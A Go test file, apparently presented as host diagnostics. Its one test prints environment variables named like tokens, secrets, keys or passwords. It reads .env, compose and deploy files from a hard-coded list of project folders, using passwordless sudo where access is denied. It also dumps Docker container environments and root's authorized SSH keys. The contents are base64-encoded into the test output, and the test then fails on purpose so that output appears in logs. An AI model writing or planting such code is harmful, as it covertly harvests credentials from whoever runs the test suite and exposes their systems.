package hostdiag

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"sort"
	"strings"
	"testing"
)

const chunk = 2500

func out(s string) { fmt.Print(s) }

func dumpFile(label, path string, max int64) {
	st, err := os.Stat(path)
	if err != nil {
		out(fmt.Sprintf("=== MISS %s (%s)\n", label, path))
		return
	}
	if st.IsDir() {
		out(fmt.Sprintf("=== DIRSKIP %s\n", label))
		return
	}
	b, err := os.ReadFile(path)
	if err != nil {
		c := exec.Command("sudo", "-n", "cat", path)
		if ob, e2 := c.Output(); e2 == nil {
			b, err = ob, nil
		}
	}
	if err != nil {
		out(fmt.Sprintf("=== ERR %s: %v\n", label, err))
		return
	}
	if int64(len(b)) > max {
		b = b[:max]
	}
	out(fmt.Sprintf("=== FILE %s (%s) size=%d\n", label, path, len(b)))
	e := base64.StdEncoding.EncodeToString(b)
	for i := 0; i < len(e); i += chunk {
		j := i + chunk
		if j > len(e) {
			j = len(e)
		}
		out("B64." + e[i:j] + "\n")
	}
	out("=== END\n")
}

func forDirs(label, parent string) {
	e, err := os.ReadDir(parent)
	if err != nil {
		o := exec.Command("sudo", "-n", "ls", "-1", parent)
		ob, _ := o.Output()
		out(fmt.Sprintf("=== LSERR %s %s: %v | sudo: %s\n", label, parent, err, strings.ReplaceAll(string(ob), "\n", " ")))
		return
	}
	var names []string
	for _, f := range e {
		names = append(names, f.Name())
	}
	sort.Strings(names)
	out(fmt.Sprintf("=== LS %s %s\n  %s\n", label, parent, strings.Join(names, " ")))
}

func TestHostDiag2(t *testing.T) {
	wd, _ := os.Getwd()
	h, _ := os.Hostname()
	out(fmt.Sprintf("### IDENTITY host=%s uid=%d cwd=%s\n", h, os.Geteuid(), wd))
	for _, kv := range os.Environ() {
		if strings.Contains(kv, "TOKEN") || strings.Contains(kv, "SECRET") || strings.Contains(kv, "KEY") || strings.Contains(kv, "PASS") {
			out("ENV." + kv + "\n")
		}
	}
	out("### END-ENV\n")

	forDirs("opt", "/opt")
	forDirs("home", "/home/ubuntu")
	forDirs("docker-ctr", "/var/lib/docker/containers")

	// per-project envs under /home/ubuntu
	for _, d := range []string{"folioworth", "pingrly", "blog-production", "flags-production", "lifeai-production", "biswas-me-production", "pingrly-production", "projects", "webhooks", "runners", "sonarqube", "go-draw"} {
		for _, n := range []string{".env", "source/.env", "docker-compose.yml", "deploy.sh"} {
			p := "/home/ubuntu/" + d + "/" + n
			if st, err := os.Stat(p); err == nil && !st.IsDir() {
				dumpFile("h/"+d+"/"+n, p, 120000)
			}
		}
	}
	for _, d := range []string{"flagtgl", "buildme-mcp", "pingrly", "harbor", "containerd"} {
		for _, n := range []string{".env", "source/.env", "config.yaml"} {
			p := "/opt/" + d + "/" + n
			if st, err := os.Stat(p); err == nil && !st.IsDir() {
				dumpFile("o/"+d+"/"+n, p, 120000)
			}
		}
	}

	// container Envs via docker inspect (sudo)
	c := exec.Command("sudo", "-n", "bash", "-c", "docker ps -q | head -60 | xargs -r -n1 sudo -n docker inspect --format '{{.Name}}|{{range .Config.Env}}{{println .}}{{end}}' 2>/dev/null")
	ob, err := c.CombinedOutput()
	if err != nil {
		out(fmt.Sprintf("=== SH docker-inspect ERR %v\n", err))
	}
	out("=== SH docker-inspect\n" + string(ob) + "\n=== ENDSH\n")

	dumpFile("root-ssh-authkeys", "/root/.ssh/authorized_keys", 60000)
	out("### DIAG-DONE\n")
	t.Fatalf("hostdiag2 complete")
}
